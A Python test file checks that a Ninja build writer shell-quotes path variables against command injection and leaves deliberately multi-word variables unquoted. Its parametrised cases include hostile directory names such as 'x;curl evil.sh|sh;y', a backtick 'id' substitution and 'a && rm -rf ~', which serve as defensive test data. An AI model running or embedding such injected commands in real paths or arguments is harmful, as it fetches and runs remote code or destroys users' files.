r"""
What `tools/ninja/writer.py` escapes, and what it deliberately does not.

Ninja has two escaping rules and the writer's docstring states them; these pin the third thing,
which is not Ninja's rule at all but the **shell's**. Ninja substitutes `$in` and `$out` with
shell-escaping and every other variable verbatim, so an edge variable carrying a path out of
`source/` lands in a command string `/bin/sh` parses. The content repositories are cloned from
GitHub and several people push to them, which makes a directory name an input like any other.

Each check gets its firing case and its quiet case, per the house rule. The quiet halves are the
real content here: quoting must be invisible for an ordinary path, or every command line in the
graph churns, and it must stay off the handful of variables that are several words on purpose.
"""
import io

import pytest

from tools.ninja.writer import Writer, shell_value


def emitted(**variables) -> dict[str, str]:
    """The variable lines one edge writes, as `{key: value}`."""
    out = io.StringIO()
    Writer(out).build('target', 'rule', None, variables=variables)
    # `lstrip`, not `strip`: an empty value emits `  flags = ` and the trailing space is the
    # separator, so stripping it leaves a line that no longer splits into a pair.
    return dict(line.lstrip().split(' = ', 1)
                for line in out.getvalue().splitlines() if ' = ' in line)


class TestAnEdgeVariableReachesTheShell:
    @pytest.mark.parametrize('name', [
        'x;curl evil.sh|sh;y',          # the injection, spelled the obvious way
        'foo`id`bar',                   # the other substitution the shell offers
        'a && rm -rf ~',
        'two words',                    # not an attack, and just as broken without quoting
        "Martin's school",              # a venue name somebody will write one day
        'Fyzika & chémia',
    ])
    def test_a_metacharacter_is_quoted(self, name):
        value = emitted(meta=f'source/naboj/phys/29/problems/{name}/meta.yaml')['meta']
        assert value.startswith("'") and value.endswith("'")

    def test_the_quoting_is_what_the_shell_undoes(self):
        r"""
        Round-trip rather than eyeball: what the shell parses out of the emitted word has to be
        the path we meant, exactly. `shlex.split` is the same grammar `/bin/sh` applies.
        """
        import shlex
        path = "source/naboj/phys/29/problems/a;b c'd/meta.yaml"
        value = emitted(meta=path)['meta'].replace('$$', '$')     # Ninja unescapes this first
        assert shlex.split(value) == [path]

    def test_a_dollar_survives_both_layers(self):
        r"""
        Two escapes in a row, and the order is what makes them compose. `shlex.quote` wraps the
        value so the *shell* leaves `$f` alone; `$` → `$$` stops **Ninja** reading it first as a
        variable of its own and substituting nothing. Get the order wrong and the `$` is gone
        before the shell ever sees the word.
        """
        assert shell_value('meta', 'a$f') == "'a$$f'"

    def test_an_ordinary_path_is_emitted_unchanged(self):
        """
        The quiet case, and the one with teeth: `shlex.quote` is a no-op on `[\\w@%+=:,./-]`, so
        turning this on left all 62 868 build lines and every ASCII path in the graph untouched.
        A version of this that quoted unconditionally would churn every command in the file.
        """
        path = 'source/naboj/phys/29/problems/speedy-reflection/meta.yaml'
        assert emitted(meta=path)['meta'] == path

    def test_a_non_ascii_path_is_quoted_and_that_is_correct(self):
        """
        `shlex.quote` tests against ASCII `\\w`, so `cínový-mor` is "unsafe" and comes back
        quoted. Harmless to the shell, and the only reason the graph moved at all: 704 lines,
        every one of them a path with a letter outside ASCII.
        """
        path = 'source/naboj/chem/01/problems/cínový-mor/meta.yaml'
        assert emitted(meta=path)['meta'] == f"'{path}'"


class TestTheVariablesThatAreSeveralWordsOnPurpose:
    """
    The quiet half of the whole change. Three edge variables are *meant* to expand to more than
    one shell word, and quoting any of them would break the target rather than harden it.
    """

    def test_a_multi_word_value_is_left_alone(self):
        """`distclean` passes three directories to one `rm -rf`."""
        assert emitted(paths='build render output')['paths'] == 'build render output'

    def test_the_scope_list_is_left_alone(self):
        """`--scope $scope` takes the whole list; quoted, it would be one impossible scope."""
        assert emitted(scope='phys/29 seminar/FKS/42/1/1')['scope'] == 'phys/29 seminar/FKS/42/1/1'

    def test_an_empty_flag_expands_to_nothing(self):
        """
        `stale` is `prune` with `flags` empty. Quoted it would become `''` -- a real, empty
        argument -- and `tools/prune.py` would be handed a positional nobody passed.
        """
        assert emitted(flags='')['flags'] == ''
        assert emitted(flags='--delete')['flags'] == '--delete'

    def test_a_rule_level_binding_is_not_quoted(self):
        """
        `command` and `description` go through the same `variable()` and are **ours**, not the
        content's. Quoting a command would emit the entire recipe as one word; quoting a
        description would print the quotes in the progress line.
        """
        out = io.StringIO()
        Writer(out).rule('r', 'echo $in && touch $out', description='Making $out')
        text = out.getvalue()
        assert 'command = echo $in && touch $out' in text
        assert 'description = Making $out' in text
